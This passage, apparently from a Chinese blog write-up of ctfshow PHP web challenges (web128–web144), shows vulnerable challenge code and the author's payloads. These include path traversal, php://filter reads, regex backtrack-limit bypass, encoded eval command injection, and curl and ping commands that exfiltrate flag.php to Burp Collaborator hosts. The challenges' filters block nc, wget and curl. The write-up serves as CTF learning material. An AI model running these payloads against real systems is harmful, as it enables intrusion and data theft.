var_dump(call_user_func(call_user_func($f1,$f2)));<br>&#125;else&#123;<br>    echo &quot;嗯哼？&quot;;<br>&#125;<br><br>function check($str)&#123;<br>    return !preg_match(&#x27;/[0-9]|[a-z]/i&#x27;, $str);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>检测f1，但是f1不能是数字和字母，这应该是一个独特的知识点</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll<br>可以将参数翻译成指定语言，一般就是原封不动的输出参数<br>get_defined_vars() — 返回由所有已定义变量所组成的数组 两个一起结合就可以获得 $flag<br>?f1=_&amp;f2=get_defined_vars<br></code></pre></td></tr></table></figure>
+
+<h3 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>if(isset($_GET[&#x27;f&#x27;]))&#123;<br>    $f = $_GET[&#x27;f&#x27;];<br>    if(stripos($f, &#x27;ctfshow&#x27;)&gt;0)&#123;<br>        echo readfile($f);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">stripos() — 查找字符串首次出现的位置（不区分大小写）<br></code></pre></td></tr></table></figure>
+
+<p>嘶，琢磨半天不知道是目录超越，再一看hint也没看懂这个payload</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">?f=/ctfshow/../../../../var/www/html/flag.php<br>///var/www/html这个是网站根目录<br></code></pre></td></tr></table></figure>
+
+<p>然后又看了别的师傅的wp，伪协议直接读取到了。。。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?f=php://filter/ctfshow/resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<h3 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>include(&quot;flag.php&quot;);<br>if(isset($_POST[&#x27;f&#x27;]))&#123;<br>    $f = $_POST[&#x27;f&#x27;];<br><br>    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;<br>        die(&#x27;bye!&#x27;);<br>    &#125;<br>    if(stripos($f, &#x27;ctfshow&#x27;) === FALSE)&#123;<br>        die(&#x27;bye!!&#x27;);<br>    &#125;<br><br>    echo $flag;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>过滤了ctfshow?,大错特错，</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">.+?：匹配任意字符（包括空格、符号等），但尽可能少匹配，直到遇到 ctfshow。<br>ctfshow：必须匹配这个字符串（但大小写不敏感）。<br>通过 s 修饰符，可以跨行匹配（例如，字符串可能跨越多行）。<br>stripos() 确认ctfshow出现<br></code></pre></td></tr></table></figure>
+
+<p>在不加转义字符的前提下，前面的点表示任意字符，而“+?”表示非贪婪匹配，即前面的字符至少出现一次,因为是.+?尽可能少的匹配，那我们直接可以别去匹配不就得了</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">payload:f=ctfshow<br></code></pre></td></tr></table></figure>
+
+<h3 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>include(&quot;flag.php&quot;);<br>if(isset($_POST[&#x27;f&#x27;]))&#123;<br>    $f = (String)$_POST[&#x27;f&#x27;];<br><br>    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;<br>        die(&#x27;bye!&#x27;);<br>    &#125;<br>    if(stripos($f,&#x27;36Dctfshow&#x27;) === FALSE)&#123;<br>        die(&#x27;bye!!&#x27;);<br>    &#125;<br><br>    echo $flag;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>利用所有常规手段无法绕过时，那我们可以试试百万回溯</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">只需要输入的匹配字符串长度大于1000000，那么preg_match函数就会直接返回false<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">import requests<br>url = &#x27;&#x27;<br>s = &#x27;very&#x27;*250000 + &#x27;36Dctfshow&#x27;<br>data = &#123;&#x27;f&#x27;: s&#125;<br><br># 禁用 SSL 验证 不禁用会报错<br>ret = requests.post(url, data=data, verify=False).text<br>print(ret)<br></code></pre></td></tr></table></figure>
+
+<h3 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h3><p>目录爆破一下看到&#x2F;robots.txt，有给&#x2F;admin路由，访问得源码</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>include(&quot;flag.php&quot;);<br>highlight_file(__FILE__);<br><br><br>if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123;<br>    $username = (String)$_GET[&#x27;username&#x27;];<br>    $password = (String)$_GET[&#x27;password&#x27;];<br>    $code = (String)$_GET[&#x27;code&#x27;];<br><br>    if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123;<br>        <br>        if($code == &#x27;admin&#x27;)&#123;<br>            echo $flag;<br>        &#125;<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>第一眼看代码感觉有点不可思议的，既然$code是随机数那怎么搞，再仔细一看&amp;&amp;的优先级是比||高的，那我们就可以明白了</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">要么$code === mt_rand(1,0x36D) &amp;&amp; $password === $flag这个成立<br>或者$username ===&quot;admin&quot;这个成立<br>我们只需要让username==admin就能过这个判断了，password可以随便传<br></code></pre></td></tr></table></figure>
+
+<p>那我们payload就好创了</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">payload:/admin/?username=admin&amp;code=admin&amp;password=1<br></code></pre></td></tr></table></figure>
+
+<h3 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>//flag.php<br>if($F = @$_GET[&#x27;F&#x27;])&#123;<br>    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123;<br>        eval(substr($F,0,6));<br>    &#125;else&#123;<br>        die(&quot;6个字母都还不够呀?!&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>涨知识了</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">payload：?F=`$F`;+curl -X POST -F xx=@flag.php  http://pa3f0c0grzper3py1qu4nkhct3zunmbb.oastify.com<br>网址是Burp Collaborator 的临时接收服务，这功能也是第一次知道是干什么的<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">来说说这个骚的绕过姿势`$F`;+<br>因为会先经过substr($F,0,6)截取六个字符后得到 `$F `;<br>然后执行 eval(&quot;`$F `;&quot;);<br>因此执行的就是$F中的内容，而其中的 $F 原本是我们传入的内容<br>所以执行的是 eval(&quot;``$F `;+curl -X`&quot;); 也就会执行 curl -X。<br></code></pre></td></tr></table></figure>
+
+<p>然后我们介绍一下curl</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">curl 命令：通过 curl 发起一个 HTTP POST 请求，将 flag.php 文件内容作为表单字段 xx 的值发送到攻击者的服务器。<br>#其中-F 为带文件的形式发送post请求<br>#xx是上传文件的name值，flag.php就是上传的文件 <br></code></pre></td></tr></table></figure>
+
+<p>而我们所弄的接收的服务器就是来自，burp Collaborator所创建的。原理就是将flag.php上传到bp的Collaborator Client.获得flag</p>
+<h3 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>$key1 = 0;<br>$key2 = 0;<br>if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123;<br>    die(&quot;nonononono&quot;);<br>&#125;<br>@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);<br>extract($_POST);<br>if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123;<br>    die(file_get_contents(&#x27;flag.php&#x27;));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>先介绍一下新朋友<code>extract</code></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">extract() — 从数组中将变量导入到当前的符号表<br>#本题的意思就是把_POST数组的变量导入当前符号表<br></code></pre></td></tr></table></figure>
+
+<p>然后说一下老朋友的新姿态<code>@parse_str($_SERVER[&#39;QUERY_STRING&#39;]);</code></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&#x27;QUERY_STRING&#x27;query string（查询字符串），如果有的话，通过它进行页面访问。 <br></code></pre></td></tr></table></figure>
+
+<p>那么我们可以本地测试一下与他们多了解了解</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);<br>var_dump($_POST);?&gt;<br>我们传入 _POST[‘a’]=123<br>会发现输出的结果为array(1) &#123; [&quot;‘a’&quot;]=&gt; string(3) “123” &#125;<br>也就是说现在的$_POST[‘a’]存在并且值为123<br>题目中还有个extract($_POST)<br>extract() 函数从数组中将变量导入到当前的符号表,也就是说把键名当作变量名，值作为变量的值<br>这样的话 $a==123<br></code></pre></td></tr></table></figure>
+
+<p>就是说如果我们用POST数组传入key1与key2，我们也能控制住他们的值</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">payload：/?_POST[key1]=36d&amp;_POST[key2]=36d<br></code></pre></td></tr></table></figure>
+
+<h3 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>//flag.php<br>if($F = @$_GET[&#x27;F&#x27;])&#123;<br>    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;, $F))&#123;<br>        eval(substr($F,0,6));<br>    &#125;else&#123;<br>        die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>诶，curl命令被ban了，看看hint，居然还可以用ping命令</p>
+<p>可以使用ping命令带出flag</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">`$F`;+ping `cat flag.php|awk &#x27;NR==2&#x27;`.ne5d4a4evxtcv1tw5oy2rilax13srnfc.oastify.com<br>//需要一行一行查询<br>//awk &#x27;NR==2&#x27; 筛选出文件的第二行<br></code></pre></td></tr></table></figure>
+
+<p>还有另一种做法，就是把flag.php写入到别的文件(光被名字web133plus带偏了，完全没想到可以这样做</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">/?F=&#x27;$F&#x27;+;cp+flag.php+1.txt   //但是本质还是有关于&#x27;$F&#x27;+;的这个骚姿势<br></code></pre></td></tr></table></figure>
+
+<h3 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>function check($x)&#123;<br>    if(preg_match(&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;<br>        die(&#x27;too young too simple sometimes naive!&#x27;);<br>    &#125;<br>&#125;<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    check($c);<br>    exec($c);<br>&#125;<br>else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>纯纯涨知识的题目，linux中还可以用tee写文件，Tee是Linux，用于显示程序的输出并将其复制到一个文件中。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">payload:/?c=ls /|tee 1   #然后访问1下载得到f149_15_h3r3<br>/?c=cat /f149_15_h3r3|tee 2   同样下载获得flag<br></code></pre></td></tr></table></figure>
+
+<h3 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>class ctfshow<br>&#123;<br>    function __wakeup()&#123;<br>        die(&quot;private class&quot;);<br>    &#125;<br>    static function getFlag()&#123;<br>        echo file_get_contents(&quot;flag.php&quot;);<br>    &#125;<br>&#125;<br><br>call_user_func($_POST[&#x27;ctfshow&#x27;]);<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">call_user_func() — 把第一个参数作为回调函数调用,就是当作函数调用了<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">payload：ctfshow=ctfshow:getFlag<br>/*ctfshow 是一个类（Class）。<br>getFlag 是这个类中的一个静态方法（Static Method）或常量（Constant）。<br>:: 的作用是告诉程序：“我要访问 ctfshow 类中的 getFlag 方法/常量”。*/<br>在编程中，双冒号 :: 是 作用域解析操作符（Scope Resolution Operator），常见于面向对象编程语言（如 PHP、C++ 等）。它的作用是明确访问某个类（或命名空间）中的 静态成员（方法或属性） 或 常量。<br></code></pre></td></tr></table></figure>
+
+<h3 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>class ctfshow<br>&#123;<br>    function __wakeup()&#123;<br>        die(&quot;private class&quot;);<br>    &#125;<br>    static function getFlag()&#123;<br>        echo file_get_contents(&quot;flag.php&quot;);<br>    &#125;<br>&#125;<br><br>if(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-1)&#123;<br>    die(&quot;private function&quot;);<br>&#125;<br><br>call_user_func($_POST[&#x27;ctfshow&#x27;]);<br></code></pre></td></tr></table></figure>
+
+<p>数组也能调用类</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">payload:ctfshow[]=ctfshow&amp;ctfshow[]=getFlag<br></code></pre></td></tr></table></figure>
+
+<h3 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>if(isset($_POST[&#x27;f1&#x27;]) &amp;&amp; isset($_POST[&#x27;f2&#x27;]))&#123;<br>    $f1 = (String)$_POST[&#x27;f1&#x27;];<br>    $f2 = (String)$_POST[&#x27;f2&#x27;];<br>    if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f1))&#123;<br>        if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f2))&#123;<br>            $code = eval(&quot;return $f1($f2());&quot;);<br>            if(intval($code) == &#x27;ctfshow&#x27;)&#123;<br>                echo file_get_contents(&quot;flag.php&quot;);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>f1与f2都只能是数字，然后进行的是一个函数调用的返回值<code>return f1(f2());</code></p>
+<p>我们要让<code>intval($code) == &#39;ctfshow&#39;</code>成立，众所周知，弱比较字母可以恒比为0，<code>intval($code) == 0</code></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">f1=system&amp;f2=phpinfo   #这个有反应，找半天发现flag在源码<br>f1=system&amp;f2=system    #布尔值 false<br></code></pre></td></tr></table></figure>
+
+<h3 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h3><p><img src="/img/ctfshow-php/img-03.png" alt="3873ff67-fa0e-491f-b9a9-703489063aa7-20250316195428-vgcxu4u"></p>
+<p>先测试呗，v1，v2只能是数字和数字符号，v3只能是非单词符号</p>
+<p>然后可恶，不会了，这里的hint是取反绕过</p>
+<p><img src="/img/ctfshow-php/img-04.png" alt="6acd20fd-f965-4476-a60b-900d102ff6a0-20250316195649-5hrur92"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">payload:v1=12&amp;v2=2&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)-<br>#测试了后发现前后都得是符号才行<br></code></pre></td></tr></table></figure>
+
+<h3 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>if(isset($_GET[&#x27;v1&#x27;]))&#123;<br>    $v1 = (String)$_GET[&#x27;v1&#x27;];<br>    if(is_numeric($v1))&#123;<br>        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);<br>        sleep($d);<br>        echo file_get_contents(&quot;flag.php&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">sleep() — 延缓执行<br></code></pre></td></tr></table></figure>
+
+<p>延时$d秒出flag，咱们肯定是越快越好，直接0起手，发现过了</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">payload:v1=0<br></code></pre></td></tr></table></figure>
+
+<h3 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-10-13 11:25:09<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-10-18 12:48:14<br><br>*/<br><br>highlight_file(__FILE__);<br>if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;<br>    $v1 = (String)$_GET[&#x27;v1&#x27;];<br>    $v2 = (String)$_GET[&#x27;v2&#x27;];<br>    $v3 = (String)$_GET[&#x27;v3&#x27;];<br>    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;<br>        if(preg_match(&#x27;/[a-z]|[0-9]|\+|\-|\.|_|\||\$|\&#123;|\&#125;|~|\%|\&amp;|\;/i&#x27;, $v3))&#123;<br>                die(&#x27;get out hacker!&#x27;);<br>        &#125;<br>        else&#123;<br>            $code =  eval(&quot;return $v1$v3$v2;&quot;);<br>            echo &quot;$v1$v3$v2 = &quot;.$code;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">在 web141 的基础上新增过滤加减、取反、或，我们可以使用乘除号代替加减号，取反、或不能使用我们还可以采用异或运算构造 payload。<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">payload：?v1=1&amp;v2=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0c%0c&quot;^&quot;%60%7f&quot;)*<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-10-13 11:25:09<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-10-18 16:21:15<br><br>*/<br><br>highlight_file(__FILE__);<br>if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;<br>    $v1 = (String)$_GET[&#x27;v1&#x27;];<br>    $v2 = (String)$_GET[&#x27;v2&#x27;];<br>    $v3 = (String)$_GET[&#x27;v3&#x27;];<br><br>    if(is_numeric($v1) &amp;&amp; check($v3))&#123;<br>        if(preg_match(&#x27;/^\W+$/&#x27;, $v2))&#123;<br>            $code =  eval(&quot;return $v1$v3$v2;&quot;);<br>            echo &quot;$v1$v3$v2 = &quot;.$code;<br>        &#125;<br>    &#125;<br>&#125;<br><br>function check($str)&#123;<br>    return strlen($str)===1?true:false;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">交换了一下v2和v3的位置，v2不能是字母、数字、下划线的字符，我们交换一下位置即可<br>payload:?v1=1&amp;v3=-&amp;v2=(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%0c%01%07%01%0f%08%0f&quot;^&quot;%7f%60%60%20%60%60%60%60%2f%7f%60%7f&quot;)<br></code></pre></td></tr></table></figure>
+
